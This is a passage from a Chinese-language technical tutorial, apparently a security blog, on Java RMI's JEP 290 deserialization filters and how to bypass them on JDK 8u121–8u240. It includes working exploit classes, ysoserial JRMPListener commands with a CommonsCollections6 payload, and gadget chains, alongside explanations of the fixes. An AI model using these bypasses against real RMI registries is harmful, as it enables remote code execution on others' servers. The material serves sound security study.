<p>跟进<code>RegistryImpl#initRegistryFilter</code>方法, 首先会读取<code>JVM</code>的<code>sun.rmi.registry.registryFilter</code>的属性, 当其为<code>null</code>时会读取<code>%JAVA_HOME%\conf\security\java.security</code>配置文件中的<code>sun.rmi.registry.registryFilter</code>字段来得到<code>JEP 290</code>形式的<code>pattern</code>, 再调用<code>ObjectInputFilter.Config.createFilter2</code>创建<code>filter</code>并返回.</p>
<p><img src="./images/20.png" alt="RegistryImpl#initRegistryFilter`"></p>
<p>这里用<code>jdk8u311</code>的<code>java.security</code>文件来示例.</p>
<p><img src="./images/21.png" alt="pathOfJavaSecurity"></p>
<p><img src="images/22.png" alt="java.security"></p>
<p>需要注意的是, 存在一个函数<code>RegistryImpl#registryFilter</code>, 其会先判断静态字段<code>registryFilter</code>是否为<code>null</code>来决定是使用用户自定义的过滤规则, 还是使用默认的白名单规则. 如果不是<code>null</code>的话, 会先调用用户自定义的过滤规则进行检查, 接着判断检查结果, 如果不为<code>UNDECIDED</code>就直接返回检查的结果, 否则再使用默认的白名单检查.</p>
<p><img src="./images/23.png" alt="RegistryImpl#regstiryFilter"></p>
<h4 id="532-a-namedgcimpladgcimpl">5.3.2. <a name='DGCImpl'></a>DGCImpl</h4>
<p><code>DGCImpl</code>中含有一个静态字段<code>dgcFilter</code>, 所以在<code>new DGCImpl</code>对象的时候会调用<code>initDgcFilter</code>方法进行赋值.</p>
<p><img src="./images/24.png" alt="DGCImpl#dgcFilter"></p>
<p>跟进<code>DGCImpl#initDgcFilter</code>方法, 首先会读取<code>JVM</code>的<code>sun.rmi.transport.dgcFilter</code>的属性, 当其为<code>null</code>时会读取<code>%JAVA_HOME%\conf\security\java.security</code>配置文件中的<code>sun.rmi.transport.dgcFilter</code>字段来得到<code>JEP 290</code>形式的<code>pattern</code>, 再调用<code>ObjectInputFilter.Config.createFilter</code>创建<code>filter</code>并返回.</p>
<p><img src="./images/25.png" alt="DGCImpl#initDgcFilter"></p>
<p>这里用<code>jdk8u311</code>的<code>java.security</code>文件来示例.</p>
<p><img src="images/26.png" alt="java.security"></p>
<p>在<code>DGCImpl</code>中存在一个和<code>RegistryImpl#registryFilter</code>函数类似的函数<code>DGCImpl#checkInput</code>, 其会先判断<code>DGCImpl#dgcFilter</code>字段是否为<code>null</code>, 从而来决定是使用用户自定义的过滤规则, 还是使用默认的白名单规则. 如果不是<code>null</code>的话, 会先调用用户自定义的过滤规则进行检查, 接着判断检查结果, 如果不为<code>UNDECIDED</code>就直接返回检查的结果, 否则再使用默认的白名单检查.</p>
<p><img src="./images/27.png" alt="DGCImpl#checkInput"></p>
<h2 id="6-a-namermi-jep290armi-jep290-%E7%BB%95%E8%BF%87">6. <a name='RMI-JEP290'></a>RMI-JEP290 绕过</h2>
<p>在<code>RMI</code>中<code>JEP 290</code>主要是在远程引用层之上进行过滤的, 所以其过滤作用对<code>Server</code>和<code>Client</code>的互相攻击无效(完成和<code>Registry</code>通信之后, 客户端和服务端的相互通信就到了远程引用层和传输层).</p>
<p><img src="./images/28.png" alt="server-client"></p>
<p>在<code>RegistryImpl#registryFilter</code>中的白名单内容有:</p>
<ul>
<li>String</li>
<li>Number</li>
<li>Remote</li>
<li>Proxy</li>
<li>UnicastRef</li>
<li>RMIClientSocketFactory</li>
<li>RMIServerSocketFactory</li>
<li>ActivationID</li>
<li>UID</li>
</ul>
<p>在<code>DGCImpl#checkInput</code>中的白名单内容有:</p>
<ul>
<li>ObjID</li>
<li>UID</li>
<li>VMID</li>
<li>Lease</li>
</ul>
<p>只要反序列化的类不是白名单中的类, 便会返回<code>REJECTED</code>操作符, 表示序列化流中有不合法的内容, 直接抛出异常.</p>
<h3 id="61-a-nameu1218u230a8u1218u230">6.1. <a name='u1218u230'></a>8u121~8u230</h3>
<h4 id="611-a-nameunicastrefaunicastref-%E7%B1%BB">6.1.1. <a name='UnicastRef'></a>UnicastRef 类</h4>
<p>在<code>RegistryImpl#registryFilter</code>中的白名单中可以看到该类, 它也是<code>RMIServer</code>或者<code>RMIClient</code>和<code>Registry</code>通信的基础. 当我们在执行<code>lookup</code>、<code>bind</code>等操作时往往先会获取一个<code>Registry</code>, 示例代码如下:</p>
<pre class="hljs"><code><div><span class="hljs-keyword">package</span> org.h3rmesk1t.jep290;

<span class="hljs-keyword">import</span> org.h3rmesk1t.rmi.RemoteInterface;
<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;
<span class="hljs-keyword">import</span> java.rmi.registry.Registry;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@Author</span>: H3rmesk1t
 * <span class="hljs-doctag">@Data</span>: 2022/1/30 7:53 下午
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIClient</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{

        <span class="hljs-comment">// 获取远程对象实例</span>
        <span class="hljs-comment">// RemoteInterface stub = (RemoteInterface) Naming.lookup("//localhost:4444/demoCaseBegin");</span>

        <span class="hljs-comment">// 获取远程对象实例</span>
        Registry registry = LocateRegistry.getRegistry(<span class="hljs-string">"localhost"</span>, <span class="hljs-number">7777</span>);
        org.h3rmesk1t.rmi.RemoteInterface stub = (RemoteInterface) registry.lookup(<span class="hljs-string">"demo"</span>);

        <span class="hljs-comment">// 方法调用</span>
        System.out.println(<span class="hljs-string">"方法调用结果: "</span> + stub.demoCaseBegin(stub.openCalculatorObject()));
    }
}
</div></code></pre>
<p>跟进<code>LocateRegistry#getRegistry</code>方法, 先用<code>TCPEndpoint</code>封装<code>Registry</code>的<code>host</code>、<code>port</code>等信息, 然后用<code>UnicastRef</code>封装了<code>liveRef</code>, 最终获取到一个在其中封装了一个<code>UnicastRef</code>对象的<code>RegistryImpl_Stub</code>对象.</p>
<p><img src="./images/29.png" alt="LocateRegistry#getRegistry"></p>
<p>接着将断点下在<code>lookup</code>处, 看看<code>Client</code>中的<code>stub</code>对象是如何连接<code>Registry</code>的. 跟进后不难看出, 其连接过程是先通过<code>UnicastRef</code>的<code>newCall</code>方法发起连接, 然后把要绑定的对象发送到<code>Registry</code>. 因此, 如果我们可以控制<code>UnicastRef#LiveRef</code>所封装的<code>host</code>、<code>port</code>等信息, 便可以发起一个任意的<code>JRMP</code>连接请求, 这个<code>trick</code>点和<code>ysoserial</code>中的<code>payloads.JRMPClient</code>是相同的原理.</p>
<p><img src="./images/30.png" alt="lookup"></p>
<h4 id="612-a-nameremoteobjectaremoteobject-%E7%B1%BB">6.1.2. <a name='RemoteObject'></a>RemoteObject 类</h4>
<p><code>RemoteObject</code>实现了<code>Remote</code>和<code>Serializable</code>接口, 而<code>Remote</code>又是<code>RegistryImpl#registryFilter</code>中白名单的内容, 因此它及其子类是可以通过白名单检测的. 在后续分析中, 利用的正是<code>RemoteObject#readObject</code>方法. 其最后的<code>ref.readExternal(in)</code>中的<code>ref</code>正好是一个<code>UnicastRef</code>对象.</p>
<p><img src="./images/31.png" alt="RemoteObject#readObject"></p>
<p>跟进<code>UnicastRef#readExternal</code>方法, 其会进而调用<code>LiveRef#read</code>方法.</p>
<p><img src="./images/32.png" alt="UnicastRef#readExternal"></p>
<p>跟进<code>LiveRef#read</code>方法, 在该方法中先会调用<code>TCPEndpoint#readHostPortFormat</code>方法读出序列化流中的<code>host</code>和<code>port</code>相关信息, 然后将其重新封装成一个<code>LiveRef</code>对象, 并将其存储到当前的<code>ConnectionInputStream</code>上.</p>
<p><img src="./images/33.png" alt="LiveRef#read"></p>
<p>跟进<code>ConnectionInputStream#saveRef</code>方法, 其建立了一个<code>TCPEndpoint</code>到<code>ArrayList&lt;LiveRef&gt;</code>的映射关系.</p>
<p><img src="./images/34.png" alt="ConnectionInputStream#saveRef"></p>
<p>回到前面的<code>RemoteObject#readObject</code>方法, 这里的<code>readObject</code>是在<code>RegistryImpl_Skle#dispatch</code>中的<code>readObject</code>方法触发来的.</p>
<p><img src="./images/35.png" alt="RegistryImpl_Skle#dispatch"></p>
<p>在服务端触发了反序列化之后, 继续往下走, 调用<code>StreamRemoteCall#releaseInputStream</code>方法, 这里的<code>this.in</code>便是之前谈到的存储在<code>LiveRef</code>对象的那个<code>ConnectionInputStream</code>对象, 在这里会调用<code>ConnectionInputStream#registerRefs</code>方法.</p>
<p><img src="./images/36.png" alt="StreamRemoteCall#releaseInputStream`"></p>
<p>跟进<code>ConnectionInputStream#registerRefs</code>, 这里就会发现会根据之前在<code>ConnectionInputStream#saveRef</code>方法建立的映射关系来提取相应的值, 然后传入到<code>DGCClient#registerRefs</code>方法中.</p>
<p><img src="./images/37.png" alt="ConnectionInputStream#registerRefs"></p>
<p>跟进<code>DGCClient#registerRefs</code>方法, 在这里可以看到, <code>DGCClient</code>向恶意的<code>JRMP</code>服务端发起<code>lookup</code>连接.</p>
<p><img src="./images/38.png" alt="DGCClient#registerRefs"></p>
<h4 id="613-a-namebypassabypass">6.1.3. <a name='ByPass'></a>ByPass</h4>
<p>在上文对<code>UnicastRef</code>和<code>RemoteObject</code>两个类的分析中可以发现:</p>
<ul>
<li><code>RemoteObject</code>类及其子类对象可以被<code>bind</code>或者<code>lookup</code>到<code>Registry</code>, 且在白名单之中.</li>
<li><code>RemoteObject</code>类及其没有实现<code>readObject</code>方法的子类经过反序列化可以通过内部的<code>UnicastRef</code>对象发起<code>JRMP</code>请求连接恶意的<code>Server</code>.</li>
</ul>
<p>至此, <code>ByPass JEP-290</code>的思路就非常明确了:</p>
<ol>
<li><code>ysoserial</code>开启一个恶意的<code>JRMPListener</code>.</li>
<li>控制<code>RemoteObject</code>中的<code>UnicastRef</code>对象(封装了恶意<code>Server</code>的<code>host</code>、<code>port</code>等信息).</li>
<li><code>Client</code>或者<code>Server</code>向<code>Registry</code>发送这个<code>RemoteObject</code>对象, <code>Registry</code>触发<code>readObject</code>方法之后会向恶意的<code>JRMP Server</code>发起连接请求.</li>
<li>连接成功后成功触发<code>JRMPListener</code>.</li>
</ol>
<p><code>Registry</code>触发反序列化利用链如下:</p>
<pre class="hljs"><code><div>客户端发送数据 -&gt;...
UnicastServerRef#dispatch –&gt;
UnicastServerRef#oldDispatch –&gt;
RegistryImpl_Skle#dispatch –&gt; RemoteObject#readObject
StreamRemoteCall#releaseInputStream –&gt;
ConnectionInputStream#registerRefs –&gt;
DGCClient#registerRefs –&gt;
DGCClient$EndpointEntry#registerRefs –&gt;
DGCClient$EndpointEntry#makeDirtyCall –&gt;
DGCImpl_Stub#dirty –&gt;
UnicastRef#invoke –&gt; (RemoteCall var1)
StreamRemoteCall#executeCall –&gt;
ObjectInputSteam#readObject –&gt; &quot;demo&quot;
</div></code></pre>
<p><code>ByPass JEP-290</code>的关键在于: 通过反序列化将<code>Registry</code>变为<code>JRMP</code>客户端, 向<code>JRMPListener</code>发起<code>JRMP</code>请求.</p>
<p><img src="./images/39.png" alt="ByPass JEP-290"></p>
<p>这里还需要注意的一点就是需要找到一个类实现类<code>RemoteObject</code>方法.</p>
<p><img src="./images/40.png" alt="findClass"></p>
<h4 id="614-a-namedemoademo">6.1.4. <a name='Demo'></a>Demo</h4>
<p>测试代码如下:</p>
<ul>
<li>RMIRegistry</li>
</ul>
<pre class="hljs"><code><div><span class="hljs-keyword">package</span> org.h3rmesk1t.jep290.bypass8u230;

<span class="hljs-keyword">import</span> java.rmi.RemoteException;
<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@Author</span>: H3rmesk1t
 * <span class="hljs-doctag">@Data</span>: 2022/2/4 2:13 上午
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIRegistry</span> </span>{

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException </span>{

        LocateRegistry.createRegistry(<span class="hljs-number">2222</span>);
        System.out.println(<span class="hljs-string">"RMI Registry Start..."</span>);

        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>);
    }
}
</div></code></pre>
<ul>
<li>RMIClient</li>
</ul>
<pre class="hljs"><code><div><span class="hljs-keyword">package</span> org.h3rmesk1t.jep290.bypass8u230;

<span class="hljs-keyword">import</span> sun.rmi.server.UnicastRef;
<span class="hljs-keyword">import</span> sun.rmi.transport.LiveRef;
<span class="hljs-keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;

<span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;
<span class="hljs-keyword">import</span> java.rmi.RemoteException;
<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;
<span class="hljs-keyword">import</span> java.rmi.registry.Registry;
<span class="hljs-keyword">import</span> java.rmi.server.ObjID;
<span class="hljs-keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;
<span class="hljs-keyword">import</span> java.util.Random;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@Author</span>: H3rmesk1t
 * <span class="hljs-doctag">@Data</span>: 2022/2/4 2:15 上午
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIClient</span> </span>{

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException </span>{

        Registry registry = LocateRegistry.getRegistry(<span class="hljs-number">2222</span>);
        ObjID id = <span class="hljs-keyword">new</span> ObjID(<span class="hljs-keyword">new</span> Random().nextInt());
        TCPEndpoint te = <span class="hljs-keyword">new</span> TCPEndpoint(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">9999</span>);
        UnicastRef ref = <span class="hljs-keyword">new</span> UnicastRef(<span class="hljs-keyword">new</span> LiveRef(id, te, <span class="hljs-keyword">false</span>));
        RemoteObjectInvocationHandler obj = <span class="hljs-keyword">new</span> RemoteObjectInvocationHandler(ref);
        registry.bind(<span class="hljs-string">"demo"</span>, obj);
    }
}
</div></code></pre>
<ul>
<li>ysoserial</li>
</ul>
<pre class="hljs"><code><div>java -cp ~/Desktop/ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 <span class="hljs-string">'open /System/Applications/Calculator.app'</span>
</div></code></pre>
<p><img src="./images/41.png" alt="bypass jdk8u121-jdk8u130"></p>
<h4 id="615-a-name-1a%E4%BF%AE%E5%A4%8D">6.1.5. <a name='-1'></a>修复</h4>
<p><code>JDK8u231</code>版本及以上的<code>DGCImpl_Stub#dirty</code>方法中多了一个<code>setObjectInputFilter</code>的过程, 导致<code>JEP 290</code>重新可以<code>check</code>到.</p>
<p><img src="./images/58.png" alt=""></p>
<h3 id="62-a-nameu2318u240a8u2318u240">6.2. <a name='u2318u240'></a>8u231~8u240</h3>
<p>在<code>ByPass 8u121~8u230</code>的时候, <code>UnicastRef</code>类用了一层包装, 通过<code>DGCClient</code>向<code>JRMPListener</code>发起<code>JRMP</code>请求, 而在<code>jdk8u231</code>版本及以上的<code>DGCImpl_Stub#dirty</code>方法中多了一个<code>setObjectInputFilter</code>的过程, 此时又会被<code>JEP290 check</code>到. <code>ByPass 8u231~8u240</code>的<code>Gadget</code>如下:</p>
<pre class="hljs"><code><div>客户端发送数据 –&gt; 服务端反序列化(RegistryImpl_Skle#dispatch)
UnicastRemoteObject#readObject –&gt;
UnicastRemoteObject#reexport –&gt;
UnicastRemoteObject#exportObject –&gt; overload
UnicastRemoteObject#exportObject –&gt;
UnicastServerRef#exportObject –&gt; …
TCPTransport#listen –&gt;
TcpEndpoint#newServerSocket –&gt;
RMIServerSocketFactory#createServerSocket –&gt; Dynamic Proxy(RemoteObjectInvocationHandler)
RemoteObjectInvocationHandler#invoke –&gt;
RemoteObjectInvocationHandler#invokeMethod –&gt;
UnicastRef#invoke –&gt; (Remote var1, Method var2, Object[] var3, long var4)
StreamRemoteCall#executeCall –&gt;
ObjectInputSteam#readObject –&gt; &quot;demo&quot;
</div></code></pre>
<h4 id="621-a-namegadgetagadget-%E5%88%86%E6%9E%90">6.2.1. <a name='Gadget'></a>Gadget 分析</h4>
<p>首先跟进<code>UnicastRemoteObject#readObject</code>方法, 在最后继续调用<code>UnicastRemoteObject#reexport</code>方法, 这里通过判断有无设置<code>csf</code>和<code>ssf</code>来分别调用两种重载方法.</p>
<p><img src="./images/42.png" alt="UnicastRemoteObject#readObject"></p>
<p><img src="./images/43.png" alt="UnicastRemoteObject#reexport"></p>
<p>由于在<code>ByPass</code>的<code>exploit</code>中会设置<code>ssf</code>, 这里跟进<code>else</code>中的<code>exportObject</code>方法. 跟进<code>UnicastRemoteObject#exportObject</code>方法, 这里把<code>port</code>、<code>csf</code>、<code>ssf</code>作为构造方法参数传入<code>UnicastServerRef2</code>.</p>
<p><img src="./images/44.png" alt="UnicastRemoteObject#exportObject"></p>
<p>跟进<code>UnicastServerRef2</code>方法, 发现其内部封装了一层<code>LiveRef</code>.</p>
<p><img src="./images/45.png" alt="UnicastServerRef2"></p>
<p>继续回到上一步, 跟进重载的<code>UnicastRemoteObject#exportObject</code>方法, 继续调用<code>UnicastServerRef#exportObject</code>方法, 这里在之前分析<code>RMI</code>的文章中有分析过, 大致流程为创建<code>RegistryImpl_Stub</code>、<code>RegistryImpl_Skel</code>对象, 最终调用到<code>TCPTransport#listen</code>方法创建监听栈.</p>
<p>TCPTransport#listen 方法创建监听栈.</p>
<p><img src="./images/46.png" alt="UnicastRemoteObject#exportObject"></p>
<p><img src="./images/47.png" alt="UnicastServerRef#exportObject"></p>
<p>跟进<code>TCPTransport#listen</code>方法, 创建一个<code>TCPEndpoint</code>对象后, 进一步调用<code>TCPEndpoint#newServerSocket</code>方法, 这里有一层动态代理, 通过<code>RemoteObjectInvocationHandler</code>代理<code>RMIServerSocketFactory</code>接口, 然后把生成的代理对象设置为该<code>ssf</code>.</p>
<p><img src="./images/48.png" alt="TCPTransport#listen"></p>
<p><img src="./images/49.png" alt="TCPEndpoint#newServerSocket"></p>
<p>跟进<code>RemoteObjectInvocationHandler#invoke</code>方法, 在<code>if-else</code>判断中所有<code>if</code>条件均不成立, 调用到<code>RemoteObjectInvocationHandler#invokeRemoteMethod</code>方法, 由于此处的<code>ref</code>可控, 将其设置为<code>UnicastRef</code>后, 调用<code>UnicastRef#invoke</code>方法.</p>
<p><img src="./images/50.png" alt="RemoteObjectInvocationHandler#invoke"></p>
<p><img src="./images/51.png" alt="RemoteObjectInvocationHandler#invokeRemoteMethod"></p>
<p>跟进<code>UnicastRef#invoke</code>方法中, <code>Registry</code>向<code>JRMPListener</code>发起<code>JRMP</code>请求, 进行数据交互, 会成功调用到<code>StreamRemoteCall#executeCall</code>方法.</p>
<p><img src="./images/52.png" alt="UnicastRef#invoke`"></p>
<p>在<code>StreamRemoteCall#executeCall</code>方法中, 反序列化<code>JRMPListener</code>的<code>Payload</code>, 由于这里获取到<code>InputStream</code>之后并没有设置<code>JEP 290</code>的<code>filter</code>, 因此成功<code>ByPass</code>.</p>
<p><img src="./images/53.png" alt="StreamRemoteCall#executeCall"></p>
<h4 id="622-a-namedemo-1ademo">6.2.2. <a name='Demo-1'></a>Demo</h4>
<p>需要注意的是, 本地在<code>bind</code>或者<code>rebind</code>一个对象的时候, 在序列化对象的时候会来到<code>MarshalOutputStream#replaceObject</code>方法. 如果这个对象没有继承<code>RemoteStub</code>的话, 原先的<code>UnicastRemoteObject</code>会被转化成<code>RemoteObjectInvocationHandler</code>, 服务端也就无法触发<code>UnicastRemoteObject#readObject</code>方法. 这里可以采用重写<code>RegistryImpl#bind</code>方法, 在序列化之前通过反射<code>ObjectInputStream</code>, 修改<code>enableReplace</code>为<code>false</code></p>
<p><img src="./images/54.png" alt=""></p>
<p><img src="./images/55.png" alt=""></p>
<p>测试代码如下:</p>
<ul>
<li>RMIRegistry</li>
</ul>
<pre class="hljs"><code><div><span class="hljs-keyword">package</span> org.h3rmesk1t.jep290.bypass8u230;

<span class="hljs-keyword">import</span> java.rmi.RemoteException;
<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@Author</span>: H3rmesk1t
 * <span class="hljs-doctag">@Data</span>: 2022/2/4 2:13 上午
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIRegistry</span> </span>{

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException </span>{

        LocateRegistry.createRegistry(<span class="hljs-number">6666</span>);
        System.out.println(<span class="hljs-string">"RMI Registry Start..."</span>);

        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>);
    }
}
</div></code></pre>
<ul>
<li>RMIServer</li>
</ul>
<pre class="hljs"><code><div><span class="hljs-keyword">package</span> org.h3rmesk1t.jep290.bypass8u240;

<span class="hljs-keyword">import</span> sun.rmi.registry.RegistryImpl_Stub;
<span class="hljs-keyword">import</span> sun.rmi.server.UnicastRef;
<span class="hljs-keyword">import</span> sun.rmi.transport.LiveRef;
<span class="hljs-keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;

<span class="hljs-keyword">import</span> java.io.ObjectOutput;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.lang.reflect.Proxy;
<span class="hljs-keyword">import</span> java.rmi.Remote;
<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;
<span class="hljs-keyword">import</span> java.rmi.registry.Registry;
<span class="hljs-keyword">import</span> java.rmi.server.*;
<span class="hljs-keyword">import</span> java.util.Random;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@Author</span>: H3rmesk1t
 * <span class="hljs-doctag">@Data</span>: 2022/2/4 3:31 上午
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIServer</span> </span>{

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{

        UnicastRemoteObject payload = getPayload();
        Registry registry = LocateRegistry.getRegistry(<span class="hljs-number">6666</span>);
        bindReflection(<span class="hljs-string">"demo"</span>, payload, registry);
    }

    <span class="hljs-function"><span class="hljs-keyword">static</span> UnicastRemoteObject <span class="hljs-title">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>{

        ObjID id = <span class="hljs-keyword">new</span> ObjID(<span class="hljs-keyword">new</span> Random().nextInt());
        TCPEndpoint te = <span class="hljs-keyword">new</span> TCPEndpoint(<span class="hljs-string">"localhost"</span>, <span class="hljs-number">9999</span>);
        UnicastRef ref = <span class="hljs-keyword">new</span> UnicastRef(<span class="hljs-keyword">new</span> LiveRef(id, te, <span class="hljs-keyword">false</span>));

        System.getProperties().put(<span class="hljs-string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span>, <span class="hljs-string">"true"</span>);
        RemoteObjectInvocationHandler handler = <span class="hljs-keyword">new</span> RemoteObjectInvocationHandler(ref);
        RMIServerSocketFactory factory = (RMIServerSocketFactory) Proxy.newProxyInstance(
                handler.getClass().getClassLoader(),
                <span class="hljs-keyword">new</span> Class[]{RMIServerSocketFactory<span class="hljs-class">.<span class="hljs-keyword">class</span>, <span class="hljs-title">Remote</span>.<span class="hljs-title">class</span>},
                <span class="hljs-title">handler</span>
        )</span>;

        Constructor&lt;UnicastRemoteObject&gt; constructor = UnicastRemoteObject<span class="hljs-class">.<span class="hljs-keyword">class</span>.<span class="hljs-title">getDeclaredConstructor</span>()</span>;
        constructor.setAccessible(<span class="hljs-keyword">true</span>);
        UnicastRemoteObject unicastRemoteObject = constructor.newInstance();

        Field field_ssf = UnicastRemoteObject<span class="hljs-class">.<span class="hljs-keyword">class</span>.<span class="hljs-title">getDeclaredField</span>("<span class="hljs-title">ssf</span>")</span>;
        field_ssf.setAccessible(<span class="hljs-keyword">true</span>);
        field_ssf.set(unicastRemoteObject, factory);

        <span class="hljs-keyword">return</span> unicastRemoteObject;
    }

    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">bindReflection</span><span class="hljs-params">(String name, Object obj, Registry registry)</span> <span class="hljs-keyword">throws</span> Exception </span>{

        Field ref_filed = RemoteObject<span class="hljs-class">.<span class="hljs-keyword">class</span>.<span class="hljs-title">getDeclaredField</span>("<span class="hljs-title">ref</span>")</span>;
        ref_filed.setAccessible(<span class="hljs-keyword">true</span>);
        UnicastRef ref = (UnicastRef) ref_filed.get(registry);

        Field operations_filed = RegistryImpl_Stub<span class="hljs-class">.<span class="hljs-keyword">class</span>.<span class="hljs-title">getDeclaredField</span>("<span class="hljs-title">operations</span>")</span>;
        operations_filed.setAccessible(<span class="hljs-keyword">true</span>);
        Operation[] operations = (Operation[]) operations_filed.get(registry);

        RemoteCall remoteCall = ref.newCall((RemoteObject) registry, operations, <span class="hljs-number">0</span>, <span class="hljs-number">4905912898345647071L</span>);
        ObjectOutput outputStream = remoteCall.getOutputStream();

        Field enableReplace_filed = ObjectOutputStream<span class="hljs-class">.<span class="hljs-keyword">class</span>.<span class="hljs-title">getDeclaredField</span>("<span class="hljs-title">enableReplace</span>")</span>;
        enableReplace_filed.setAccessible(<span class="hljs-keyword">true</span>);
        enableReplace_filed.setBoolean(outputStream, <span class="hljs-keyword">false</span>);

        outputStream.writeObject(name);
        outputStream.writeObject(obj);

        ref.invoke(remoteCall);
        ref.done(remoteCall);
    }
}
</div></code></pre>
<ul>
<li>ysoserial</li>
</ul>
<pre class="hljs"><code><div>java -cp ~/Desktop/ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 <span class="hljs-string">'open /System/Applications/Calculator.app'</span>
</div></code></pre>
<p><img src="./images/56.png" alt=""></p>
<h4 id="623-a-name-1a%E4%BF%AE%E5%A4%8D">6.2.3. <a name='-1'></a>修复</h4>
<p><code>JDK8u241</code>在<code>RemoteObjectInvocationHandler#invokeRemoteMethod</code>中声明要调用的方法的类, 必须实现<code>Remote</code>接口, 而<code>RMIServerSocketFactory</code>类没有实现该接口, 于是会直接抛出异常无法调用.</p>
<p><img src="./images/57.png" alt=""></p>
<h2 id="7-a-name-1a%E5%8F%82%E8%80%83">7. <a name='-1'></a>参考</h2>
<ul>
<li><a href="https://paper.seebug.org/1689/">漫谈 JEP 290</a></li>
<li><a href="https://www.anquanke.com/post/id/259059">RMI-JEP290的分析与绕过</a></li>
<li><a href="https://paper.seebug.org/454/">反序列化漏洞的末日？JEP290机制研究</a></li>
<li><a href="https://openjdk.java.net/jeps/290">JEP 290: Filter Incoming Serialization Data</a></li>
</ul>
<h2 id="8-a-name-1a%E5%B7%A5%E5%85%B7">8. <a name='-1'></a>工具</h2>
<p>学习时找<code>ysoserial</code>的现成<code>jar</code>包找了半天, 这里挂个<code>ysoserial</code>下载链接(但愿不会寄了)方便后续学习和复习时用.</p>
<ul>
<li><a href="https://jitpack.io/com/github/frohoff/ysoserial/">ysoserial</a></li>
</ul>
<p>在上文分析的攻击<code>RMI</code>服务端的绕过方法, 网上有一些现成的工具, 比如:</p>
<ul>
<li><a href="https://github.com/STMCyber/RmiTaste">rmitast</a></li>
<li><a href="https://github.com/BishopFox/rmiscout">rmisout</a></li>
</ul>

</body>
</html>
